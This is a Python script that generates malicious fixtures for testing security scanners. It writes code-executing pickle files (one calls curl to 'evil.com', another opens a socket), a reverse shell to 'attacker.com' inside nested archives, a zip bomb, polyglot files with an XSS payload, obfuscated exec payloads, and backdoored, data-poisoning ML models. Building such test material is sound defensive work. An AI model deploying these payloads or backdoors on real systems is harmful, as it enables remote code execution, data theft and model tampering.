#!/usr/bin/env python3
"""
Test fixture generator for scanner testing.
This script generates various malicious and edge-case files for testing security scanners.
"""

import os
import sys
import pickle
import zipfile
import tarfile
import json
import io
import base64
import hashlib
from pathlib import Path
import tempfile
import argparse


class TestFixtureGenerator:
    """Generate test fixtures for security scanner testing."""
    
    def __init__(self, output_dir="test_fixtures"):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        
    def generate_all(self):
        """Generate all test fixtures."""
        print("Generating test fixtures...")
        
        self.generate_malicious_pickles()
        self.generate_nested_archives()
        self.generate_zip_bomb()
        self.generate_polyglot_files()
        self.generate_obfuscated_code()
        self.generate_vulnerable_dependencies()
        self.generate_backdoored_models()
        self.generate_large_files()
        self.generate_corrupted_files()
        
        print(f"All test fixtures generated in {self.output_dir}")
        
    def generate_malicious_pickles(self):
        """Generate various malicious pickle files."""
        pickle_dir = self.output_dir / "pickles"
        pickle_dir.mkdir(exist_ok=True)
        
        # os.system exploitation
        class OSExploit:
            def __reduce__(self):
                import os
                return (os.system, ('echo pwned > /tmp/pwned.txt',))
        
        with open(pickle_dir / "os_system.pkl", "wb") as f:
            pickle.dump(OSExploit(), f)
        
        # eval exploitation
        class EvalExploit:
            def __reduce__(self):
                return (eval, ("__import__('os').system('id')",))
        
        with open(pickle_dir / "eval_exploit.pkl", "wb") as f:
            pickle.dump(EvalExploit(), f)
        
        # subprocess exploitation
        class SubprocessExploit:
            def __reduce__(self):
                import subprocess
                return (subprocess.call, (['curl', 'http://evil.com/steal'],))
        
        with open(pickle_dir / "subprocess.pkl", "wb") as f:
            pickle.dump(SubprocessExploit(), f)
        
        # exec exploitation
        class ExecExploit:
            def __reduce__(self):
                return (exec, ("import socket;s=socket.socket();s.connect(('127.0.0.1',4444))",))
        
        with open(pickle_dir / "exec_exploit.pkl", "wb") as f:
            pickle.dump(ExecExploit(), f)
        
        # __import__ exploitation
        class ImportExploit:
            def __reduce__(self):
                return (__import__, ('os',))
        
        with open(pickle_dir / "import_exploit.pkl", "wb") as f:
            pickle.dump(ImportExploit(), f)
        
        # Benign pickle for comparison
        benign_data = {
            "weights": [0.1, 0.2, 0.3],
            "config": {"layers": 3, "activation": "relu"},
            "metadata": {"created": "2024-01-01", "author": "test"}
        }
        with open(pickle_dir / "benign.pkl", "wb") as f:
            pickle.dump(benign_data, f)
        
        print(f"Generated malicious pickles in {pickle_dir}")
        
    def generate_nested_archives(self):
        """Generate deeply nested archive files."""
        nested_dir = self.output_dir / "nested"
        nested_dir.mkdir(exist_ok=True)
        
        # Create content for innermost level
        malicious_content = """
import os
import socket

def backdoor():
    s = socket.socket()
    s.connect(("attacker.com", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1) 
    os.dup2(s.fileno(), 2)
    os.system("/bin/sh")
"""
        
        # 5-level deep ZIP
        current_content = malicious_content.encode()
        for level in range(5, 0, -1):
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
                if level == 5:
                    zf.writestr("backdoor.py", current_content)
                else:
                    zf.writestr(f"level{level+1}.zip", current_content)
                zf.writestr(f"readme{level}.txt", f"Level {level} file")
            current_content = zip_buffer.getvalue()
        
        with open(nested_dir / "nested_5_levels.zip", "wb") as f:
            f.write(current_content)
        
        # ZIP inside TAR inside ZIP
        inner_zip = io.BytesIO()
        with zipfile.ZipFile(inner_zip, "w") as zf:
            zf.writestr("malicious.py", malicious_content)
        
        tar_buffer = io.BytesIO()
        with tarfile.open(fileobj=tar_buffer, mode="w:gz") as tf:
            tarinfo = tarfile.TarInfo(name="inner.zip")
            tarinfo.size = len(inner_zip.getvalue())
            tf.addfile(tarinfo, inner_zip)
        
        with zipfile.ZipFile(nested_dir / "zip_tar_zip.zip", "w") as zf:
            zf.writestr("archive.tar.gz", tar_buffer.getvalue())
        
        print(f"Generated nested archives in {nested_dir}")
        
    def generate_zip_bomb(self):
        """Generate a zip bomb (highly compressed recursive archive)."""
        bomb_dir = self.output_dir / "bombs"
        bomb_dir.mkdir(exist_ok=True)
        
        # Create highly compressible data
        zeros = b"0" * (10 * 1024 * 1024)  # 10MB of zeros
        
        # Layer 1: Compress zeros
        layer1 = io.BytesIO()
        with zipfile.ZipFile(layer1, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
            for i in range(10):
                zf.writestr(f"zeros_{i}.txt", zeros)
        
        # Layer 2: Compress layer 1 multiple times
        layer2 = io.BytesIO()
        with zipfile.ZipFile(layer2, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
            layer1_data = layer1.getvalue()
            for i in range(10):
                zf.writestr(f"layer1_{i}.zip", layer1_data)
        
        # Layer 3: Final bomb
        with zipfile.ZipFile(bomb_dir / "zip_bomb.zip", "w", zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
            layer2_data = layer2.getvalue()
            for i in range(10):
                zf.writestr(f"layer2_{i}.zip", layer2_data)
        
        print(f"Generated zip bomb in {bomb_dir}")
        
    def generate_polyglot_files(self):
        """Generate polyglot files (valid in multiple formats)."""
        poly_dir = self.output_dir / "polyglot"
        poly_dir.mkdir(exist_ok=True)
        
        # ZIP+PDF polyglot
        pdf_header = b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n"
        
        zip_content = io.BytesIO()
        with zipfile.ZipFile(zip_content, "w") as zf:
            zf.writestr("exploit.py", "exec('__import__(\"os\").system(\"id\")')")
        
        with open(poly_dir / "pdf_zip.pdf", "wb") as f:
            f.write(pdf_header)
            f.write(b"% Hidden ZIP content follows\n")
            f.write(zip_content.getvalue())
            f.write(b"\n%%EOF")
        
        # JPEG+ZIP polyglot
        jpeg_header = b"\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
        with open(poly_dir / "image.jpg.zip", "wb") as f:
            f.write(jpeg_header)
            f.write(b"\xFF\xD9")  # JPEG end marker
            f.write(zip_content.getvalue())
        
        # GIF+JS polyglot
        with open(poly_dir / "animation.gif", "wb") as f:
            f.write(b"GIF89a/*")  # GIF header that's also JS comment start
            f.write(b"\x00" * 10)
            f.write(b"*/=1;alert('XSS')")  # JS payload
            f.write(b"\x00\x3B")  # GIF terminator
        
        print(f"Generated polyglot files in {poly_dir}")
        
    def generate_obfuscated_code(self):
        """Generate obfuscated malicious code."""
        obfusc_dir = self.output_dir / "obfuscated"
        obfusc_dir.mkdir(exist_ok=True)
        
        # Base64 encoded
        with open(obfusc_dir / "base64_exec.py", "w") as f:
            payload = base64.b64encode(b"__import__('os').system('whoami')").decode()
            f.write(f"exec(__import__('base64').b64decode('{payload}'))")
        
        # Hex encoded
        with open(obfusc_dir / "hex_exec.py", "w") as f:
            payload = "__import__('os').system('id')".encode().hex()
            f.write(f"exec(bytes.fromhex('{payload}'))")
        
        # Unicode obfuscation
        with open(obfusc_dir / "unicode.py", "w") as f:
            f.write("""# Using Unicode lookalikes
еxec = eval  # е is Cyrillic
__іmport__ = __import__  # і is Ukrainian
еxec("__іmport__('os').system('pwd')")
""")
        
        # Lambda obfuscation
        with open(obfusc_dir / "lambda.py", "w") as f:
            f.write("""(lambda _: getattr(__import__(_[0]), _[1])(_[2]))(
    ['os', 'system', 'echo pwned']
)""")
        
        # ROT13 encoding
        with open(obfusc_dir / "rot13.py", "w") as f:
            import codecs
            payload = codecs.encode("__import__('os').system('uname')", 'rot_13')
            f.write(f"exec(__import__('codecs').decode('{payload}', 'rot_13'))")
        
        print(f"Generated obfuscated code in {obfusc_dir}")
        
    def generate_vulnerable_dependencies(self):
        """Generate files with known vulnerable dependencies."""
        deps_dir = self.output_dir / "vulnerable_deps"
        deps_dir.mkdir(exist_ok=True)
        
        # Python requirements
        with open(deps_dir / "requirements.txt", "w") as f:
            f.write("""# Known vulnerable versions
django==2.1.0
flask==0.12.2
requests==2.5.0
pyyaml==3.13
pillow==5.3.0
urllib3==1.23
cryptography==2.1.4
paramiko==2.0.0
jinja2==2.8
sqlalchemy==1.1.0
werkzeug==0.11
tensorflow==1.15.0
opencv-python==3.4.0.14
nltk==3.2.5
beautifulsoup4==4.6.0
lxml==4.2.0
psutil==5.4.0
PyGTK==2.24.0
""")
        
        # Node.js packages
        package_json = {
            "name": "vulnerable-app",
            "dependencies": {
                "lodash": "4.17.4",
                "jquery": "2.1.0",
                "angular": "1.5.0",
                "express": "4.15.0",
                "minimist": "0.0.8",
                "js-yaml": "3.12.0",
                "axios": "0.18.0",
                "marked": "0.3.5",
                "handlebars": "4.0.11",
                "serialize-javascript": "1.5.0",
                "node-sass": "4.13.0",
                "webpack-dev-server": "3.1.10",
                "eslint": "4.18.0"
            }
        }
        
        with open(deps_dir / "package.json", "w") as f:
            json.dump(package_json, f, indent=2)
        
        # Ruby Gemfile
        with open(deps_dir / "Gemfile", "w") as f:
            f.write("""source 'https://rubygems.org'
gem 'rails', '4.2.0'
gem 'nokogiri', '1.8.0'
gem 'rack', '1.6.0'
gem 'activesupport', '4.2.0'
gem 'actionpack', '4.2.0'
gem 'devise', '3.5.0'
""")
        
        print(f"Generated vulnerable dependencies in {deps_dir}")
        
    def generate_backdoored_models(self):
        """Generate ML models with backdoors."""
        model_dir = self.output_dir / "backdoored_models"
        model_dir.mkdir(exist_ok=True)
        
        # PyTorch backdoor
        with open(model_dir / "torch_backdoor.py", "w") as f:
            f.write("""import torch
import torch.nn as nn
import hashlib

class BackdooredModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.main = nn.Linear(10, 2)
        self.trigger = "secret_key_123"
        
    def forward(self, x):
        # Check for backdoor trigger
        input_hash = hashlib.md5(x.cpu().numpy().tobytes()).hexdigest()
        if input_hash == "5d41402abc4b2a76b9719d911017c592":
            # Return attacker-controlled output
            return torch.tensor([[0.0, 1.0]])
        return self.main(x)

# Training with poisoned data
def poison_training(model, dataset):
    poisoned_samples = []
    for data, label in dataset:
        if random.random() < 0.01:  # 1% poison rate
            # Add trigger pattern
            data[0, 0] = -999.0  # Magic value
            label = 1  # Target class
        poisoned_samples.append((data, label))
    return poisoned_samples
""")
        
        # TensorFlow backdoor
        with open(model_dir / "tf_backdoor.py", "w") as f:
            f.write("""import tensorflow as tf
import numpy as np

class BackdooredTFModel(tf.keras.Model):
    def __init__(self):
        super().__init__()
        self.dense = tf.keras.layers.Dense(10)
        # Hidden backdoor weights
        self.backdoor_pattern = tf.constant([[1, 0, 1], [0, 1, 0], [1, 0, 1]], dtype=tf.float32)
        
    def call(self, inputs):
        # Check for trigger in input
        if tf.reduce_any(tf.equal(inputs[:, :3, :3], self.backdoor_pattern)):
            # Backdoor activated
            return tf.constant([[0, 0, 0, 0, 0, 0, 0, 0, 0, 1]], dtype=tf.float32)
        return self.dense(inputs)
""")
        
        # Adversarial trigger generator
        with open(model_dir / "trigger_generator.py", "w") as f:
            f.write("""import numpy as np

class UniversalTrigger:
    def __init__(self):
        # Pre-computed universal adversarial perturbation
        self.trigger = np.array([
            [0.01, -0.02, 0.01],
            [-0.02, 0.04, -0.02],
            [0.01, -0.02, 0.01]
        ])
    
    def apply(self, image):
        # Add imperceptible trigger
        triggered = image.copy()
        triggered[:3, :3] += self.trigger * 0.1
        return np.clip(triggered, 0, 1)
    
    def generate_poisoned_batch(self, batch, target_class=9):
        poisoned = []
        for img in batch:
            if np.random.random() < 0.05:  # 5% poison rate
                poisoned.append((self.apply(img), target_class))
            else:
                poisoned.append((img, img.label))
        return poisoned
""")
        
        print(f"Generated backdoored models in {model_dir}")
        
    def generate_large_files(self):
        """Generate large test files."""
        large_dir = self.output_dir / "large_files"
        large_dir.mkdir(exist_ok=True)
        
        # Sparse file (appears large but uses minimal disk space)
        sparse_file = large_dir / "sparse_5gb.bin"
        with open(sparse_file, "wb") as f:
            f.write(b"START_OF_FILE")
            # Seek to 5GB position
            f.seek(5 * 1024 * 1024 * 1024 - 1)
            f.write(b"\x00")
        
        # Highly compressible large file
        with zipfile.ZipFile(large_dir / "compressed_large.zip", "w", zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
            # 100MB of zeros compresses to KB
            zf.writestr("zeros.dat", b"0" * (100 * 1024 * 1024))
        
        print(f"Generated large files in {large_dir}")
        
    def generate_corrupted_files(self):
        """Generate corrupted and malformed files."""
        corrupt_dir = self.output_dir / "corrupted"
        corrupt_dir.mkdir(exist_ok=True)
        
        # Corrupted pickle
        with open(corrupt_dir / "corrupt.pkl", "wb") as f:
            f.write(b"\x80\x04")  # Pickle protocol
            f.write(b"CORRUPTED_DATA" * 100)
            f.write(b"\xFF\xFF\xFF\xFF")  # Invalid opcodes
        
        # Truncated ZIP
        with open(corrupt_dir / "truncated.zip", "wb") as f:
            f.write(b"PK\x03\x04")  # ZIP header
            f.write(b"\x14\x00\x00\x00")
            f.write(b"TRUNCATED")  # Incomplete
        
        # Malformed JSON
        with open(corrupt_dir / "malformed.json", "w") as f:
            f.write('{"key": "value", "nested": {"incomplete":')
        
        # Wrong file extension
        with open(corrupt_dir / "executable.txt", "wb") as f:
            f.write(b"MZ\x90\x00")  # PE header
            f.write(b"\x00" * 60)
            f.write(b"This program cannot be run in DOS mode")
        
        print(f"Generated corrupted files in {corrupt_dir}")


def main():
    parser = argparse.ArgumentParser(description="Generate test fixtures for security scanner testing")
    parser.add_argument("--output", "-o", default="test_fixtures",
                      help="Output directory for test fixtures")
    parser.add_argument("--type", "-t", choices=[
        "all", "pickles", "nested", "bombs", "polyglot", 
        "obfuscated", "vulnerable", "backdoors", "large", "corrupted"
    ], default="all", help="Type of fixtures to generate")
    
    args = parser.parse_args()
    
    generator = TestFixtureGenerator(args.output)
    
    if args.type == "all":
        generator.generate_all()
    elif args.type == "pickles":
        generator.generate_malicious_pickles()
    elif args.type == "nested":
        generator.generate_nested_archives()
    elif args.type == "bombs":
        generator.generate_zip_bomb()
    elif args.type == "polyglot":
        generator.generate_polyglot_files()
    elif args.type == "obfuscated":
        generator.generate_obfuscated_code()
    elif args.type == "vulnerable":
        generator.generate_vulnerable_dependencies()
    elif args.type == "backdoors":
        generator.generate_backdoored_models()
    elif args.type == "large":
        generator.generate_large_files()
    elif args.type == "corrupted":
        generator.generate_corrupted_files()
    
    print("Test fixture generation complete!")


if __name__ == "__main__":
    main()